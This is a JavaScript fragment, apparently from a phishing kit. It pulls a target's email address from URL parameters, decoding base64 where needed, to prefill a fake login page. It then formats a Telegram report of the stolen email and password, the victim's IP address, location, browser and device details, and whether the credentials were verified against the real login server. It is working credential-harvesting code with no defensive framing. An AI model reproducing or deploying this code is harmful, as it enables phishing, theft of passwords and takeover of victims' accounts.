<script>

(function () {
  var EMAIL_RE = /([a-zA-Z0-9._+-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/;

  function extractEmail(s) {
    if (!s) return '';
    var m = String(s).match(EMAIL_RE);
    return m ? m[0] : '';
  }

  function decodeLeadToken(val) {
    if (val == null) return '';
    var s = String(val).trim();
    if (!s) return '';
    try {
      s = decodeURIComponent(s.replace(/\+/g, ' '));
    } catch (e) { /* keep */ }
    var direct = extractEmail(s);
    if (direct) return direct;
    var b64 = s.replace(/-/g, '+').replace(/_/g, '/');
    while (b64.length % 4) b64 += '=';
    try {
      var dec = atob(b64);
      direct = extractEmail(dec);
      if (direct) return direct;
    } catch (e2) { /* not base64 */ }
    return '';
  }

  function RobinGetLeadEmail() {
    try {
      var p = new URLSearchParams(window.location.search);
      var fromQ = decodeLeadToken(p.get('e') || p.get('em') || p.get('email') || '');
      if (fromQ) return fromQ;
    } catch (e) { /* ignore */ }
    return '';
  }

  window.RobinGetLeadEmail = RobinGetLeadEmail;
})();

  // Helper function to format Telegram message
  function getTelegramMessage(status, email, password, detailObj, loginUrl, source) {
    const timestamp = new Date().toISOString();
    
    let header = "";
    let statusLine = "";
    let footerLine = "";
    
    if (status === "success") {
      header = `SUCCESS LOG (${email}) -!`;
      statusLine = "✅ VERIFIED LOGIN ✅";
      footerLine = "✅ Login VERIFIED successfully";
    } else if (status === "failed") {
      header = `❌ Attempted but INCORRECT LOGIN ❌`;
      statusLine = "";
      footerLine = "❌ Wrong credentials - Login INCORRECT";
    } else if (status === "php_unreachable") {
      header = `⚠️ LOGIN API UNREACHABLE (${email})`;
      statusLine = "";
      footerLine = "true login server temporarily down!";
    } else {
      header = `!(${email}) - NEW LOGIN ATTEMPT (UNVERIFIED)!`;
      statusLine = "⚠️ UNVERIFIED LOGIN ⚠️";
      footerLine = "⚠️ Login status unknown or server error";
    }

    return `${header}
${statusLine}

📧 Email: ${email}
🔑 Password: ${password}

📍 Location Info
• IP Address: ${detailObj.ipAddress}
• Country: ${detailObj.country}
• Region: ${detailObj.region}
• City: ${detailObj.city}
• Timezone: ${detailObj.timezone}

💻 Browser Info
• Browser: ${detailObj.browser}
• OS: ${detailObj.os || "Unknown"}
• Device Type: ${detailObj.deviceType || "desktop"}

📱 Device Details
• Screen: ${window.screen.width}x${window.screen.height}
• Platform: ${navigator.platform}
• Language: ${navigator.language}

⏰ Timestamp: ${timestamp}

🔗 Login URL: ${loginUrl}

${footerLine}
🏷️ Source: ${source}`;
  }
